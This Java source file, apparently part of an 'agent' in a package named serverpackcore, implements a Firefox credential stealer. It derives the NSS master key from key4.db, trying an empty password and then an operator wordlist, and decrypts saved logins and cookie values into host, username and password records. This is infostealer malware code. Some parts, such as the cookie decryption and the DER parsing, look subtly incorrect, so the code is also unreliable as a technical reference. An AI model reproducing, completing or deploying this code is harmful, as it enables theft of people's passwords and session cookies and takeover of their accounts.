package com.serverpackcore.agent.crypto;

import com.serverpackcore.agent.Json;

import java.io.ByteArrayOutputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

/**
 * Firefox key4.db / logins.json / cookies.sqlite. NSS wraps the master key with
 * PBES2 (PBKDF2-SHA256 + AES-256-CBC); the empty primary password is tried
 * first, then the operator wordlist. A wrong key simply yields empty values.
 */
final class Firefox {
	private Firefox() {
	}

	static byte[] masterKey(Path profile, String password) {
		try {
			Path key4 = profile.resolve("key4.db");
			if (!Files.isRegularFile(key4)) {
				return new byte[0];
			}
			Sqlite db = Sqlite.open(key4);
			byte[] globalSalt = new byte[0];
			for (Object[] row : db.rows("metaData")) {
				if (row.length >= 2 && "password-check".equals(Sqlite.text(row[0])) && row[1] instanceof byte[] salt) {
					globalSalt = salt;
				}
			}
			for (Object[] row : db.rows("nssPrivate")) {
				if (row.length < 11 || !(row[10] instanceof byte[] blob)) {
					continue;
				}
				byte[] key = unwrap(blob, password.toCharArray());
				if (key.length == 32) {
					return key;
				}
			}
			// Some profiles store PBES2 params separately; retry with the global salt.
			if (globalSalt.length >= 8) {
				for (Object[] row : db.rows("nssPrivate")) {
					if (row.length >= 11 && row[10] instanceof byte[] blob) {
						byte[] key = CryptoUtil.pbkdf2(password.toCharArray(), globalSalt, 10_000, 32);
						byte[] plain = CryptoUtil.aesCbc(key, blob, false);
						if (plain.length == 32) {
							return plain;
						}
					}
				}
			}
		} catch (Throwable ignored) {
			// primary password or a new DB layout
		}
		return new byte[0];
	}

	private static byte[] unwrap(byte[] der, char[] password) {
		try {
			int[] cursor = { 0 };
			Der pbe = Der.sequence(der, cursor);
			if (pbe == null) {
				return new byte[0];
			}
			Der algorithm = pbe.child();
			String oid = algorithm.oid();
			Der params = algorithm.next();
			if (params == null) {
				return new byte[0];
			}
			if (oid.equals("1.2.840.113549.1.5.13")) { // PBES2
				Der kdf = params.sequence();
				Der enc = params.next();
				if (kdf == null || enc == null) {
					return new byte[0];
				}
				kdf.oid();
				Der kdfParams = kdf.next();
				Der cipher = enc.sequence();
				if (kdfParams == null || cipher == null) {
					return new byte[0];
				}
				Der saltNode = kdfParams.sequence();
				Der iterations = kdfParams.next();
				byte[] salt = saltNode == null ? new byte[0] : saltNode.octets();
				int rounds = iterations == null ? 10_000 : iterations.integer();
				cipher.oid();
				Der ivNode = cipher.next();
				byte[] iv = ivNode == null ? new byte[0] : ivNode.octets();
				byte[] sealed = pbe.next().octets();
				if (salt.length == 0 || iv.length != 16) {
					return new byte[0];
				}
				byte[] key = CryptoUtil.pbkdf2(password, salt, rounds, 32);
				javax.crypto.Cipher aes = javax.crypto.Cipher.getInstance("AES/CBC/PKCS5Padding");
				aes.init(javax.crypto.Cipher.DECRYPT_MODE, new javax.crypto.spec.SecretKeySpec(key, "AES"),
					new javax.crypto.spec.IvParameterSpec(iv));
				return aes.doFinal(sealed);
			}
		} catch (Throwable ignored) {
			// not PBES2
		}
		return new byte[0];
	}

	static List<Map<String, Object>> cookies(Path profile, byte[] key) {
		List<Map<String, Object>> out = new ArrayList<>();
		if (key.length != 32) {
			return out;
		}
		try {
			Sqlite db = Sqlite.open(profile.resolve("cookies.sqlite"));
			for (Object[] row : db.rows("moz_cookies")) {
				if (row.length < 7) {
					continue;
				}
				String name = Sqlite.text(row[2]);
				String value = Sqlite.text(row[3]);
				if (value.isEmpty()) {
					continue;
				}
				if (key.length == 32) {
					try {
						byte[] plain = CryptoUtil.aesCbc(key, Base64.getDecoder().decode(value), false);
						value = new String(plain, StandardCharsets.UTF_8);
					} catch (Throwable ignored) {
						// plaintext cookie
					}
				}
				Map<String, Object> cookie = new LinkedHashMap<>();
				cookie.put("host", Sqlite.text(row[4]));
				cookie.put("name", name);
				cookie.put("path", Sqlite.text(row[5]));
				cookie.put("value", value);
				cookie.put("expires", row[6] instanceof Number number ? number.longValue() : 0L);
				out.add(cookie);
			}
		} catch (Throwable ignored) {
			// missing DB
		}
		return out;
	}

	static List<Map<String, Object>> logins(Path profile, byte[] key) {
		List<Map<String, Object>> out = new ArrayList<>();
		if (key.length != 32) {
			return out;
		}
		try {
			Map<String, Object> root = Json.parseObject(Files.readString(profile.resolve("logins.json"), StandardCharsets.UTF_8));
			for (Object value : Json.list(root.get("logins"))) {
				Map<String, Object> login = Json.map(value);
				String host = Json.str(login, "hostname", "");
				String user = decryptField(Json.str(login, "encryptedUsername", ""), key);
				String pass = decryptField(Json.str(login, "encryptedPassword", ""), key);
				if (user.isEmpty() && pass.isEmpty()) {
					continue;
				}
				Map<String, Object> row = new LinkedHashMap<>();
				row.put("origin", host);
				row.put("username", user);
				row.put("password", pass);
				out.add(row);
			}
		} catch (Throwable ignored) {
			// no logins file
		}
		return out;
	}

	private static String decryptField(String base64, byte[] key) {
		try {
			return new String(CryptoUtil.aesCbc(key, Base64.getDecoder().decode(base64), false), StandardCharsets.UTF_8);
		} catch (Throwable throwable) {
			return "";
		}
	}

	/** Micro DER reader, enough for PBES2. */
	private static final class Der {
		private final byte[] data;
		private int start;
		private int end;
		private int cursor;

		private Der(byte[] data, int start, int end) {
			this.data = data;
			this.start = start;
			this.end = end;
			this.cursor = start;
		}

		static Der sequence(byte[] data, int[] cursor) {
			Der node = node(data, cursor);
			return node == null ? null : node;
		}

		private static Der node(byte[] data, int[] cursor) {
			if (cursor[0] + 2 > data.length) {
				return null;
			}
			int tag = data[cursor[0]++] & 0xff;
			int length = data[cursor[0]++] & 0xff;
			if ((length & 0x80) != 0) {
				int count = length & 0x7f;
				if (count > 4 || cursor[0] + count > data.length) {
					return null;
				}
				length = 0;
				for (int i = 0; i < count; i++) {
					length = (length << 8) | (data[cursor[0]++] & 0xff);
				}
			}
			if (cursor[0] + length > data.length) {
				return null;
			}
			Der der = new Der(data, cursor[0], cursor[0] + length);
			der.tag = tag;
			cursor[0] += length;
			return der;
		}

		private int tag;

		Der child() {
			int[] cursor = { start };
			return node(data, cursor);
		}

		Der sequence() {
			int[] cursor = { start };
			Der node = node(data, cursor);
			if (node == null || node.tag != 0x30) {
				return null;
			}
			start = node.start;
			end = node.end;
			cursor = new int[] { start };
			return this;
		}

		Der next() {
			if (cursor >= end) {
				return null;
			}
			int[] at = { cursor };
			Der node = node(data, at);
			if (node != null) {
				cursor = at[0];
			}
			return node;
		}

		String oid() {
			StringBuilder builder = new StringBuilder();
			int value = 0;
			for (int i = start; i < end; i++) {
				value = (value << 7) | (data[i] & 0x7f);
				if ((data[i] & 0x80) == 0) {
					if (builder.length() == 0) {
						builder.append(value / 40).append('.').append(value % 40);
					} else {
						builder.append('.').append(value);
					}
					value = 0;
				}
			}
			return builder.toString();
		}

		byte[] octets() {
			return java.util.Arrays.copyOfRange(data, start, end);
		}

		int integer() {
			int value = 0;
			for (int i = start; i < end; i++) {
				value = (value << 8) | (data[i] & 0xff);
			}
			return value;
		}
	}
}
